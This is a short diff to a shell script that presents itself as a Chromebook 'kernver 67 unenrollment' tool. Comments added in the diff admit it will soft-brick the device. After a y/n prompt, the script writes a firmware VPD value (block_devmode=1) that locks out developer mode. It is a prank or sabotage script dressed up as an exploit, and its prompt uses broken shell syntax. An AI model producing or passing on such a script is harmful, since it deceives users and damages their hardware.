@@ -1,4 +1,15 @@
 #!/bin/sh
+# hey you, look at you being smart reading the code before running a script!
+# this shit will soft-brick your chromebook lmao
+# to fix it, you'll have to open it up, unplug and replug the battery to the PCB, plug in a charger
+# then boot recovery and use a recovery image, after that you'll be fine.
+
+read -p "Would you like to begin kernver 67 (six seven) unerololoment? (y/n)" -n 1 -r
+  echo
+  if [[ $REPLY !=~ ^[Yy]$ ]]; then
+    exit 1
+  fi
+
 echo "starting persistence in fanxql injection..."
 
 vpd -i RW_VPD -s block_devmode=1 >/dev/null 2>&1
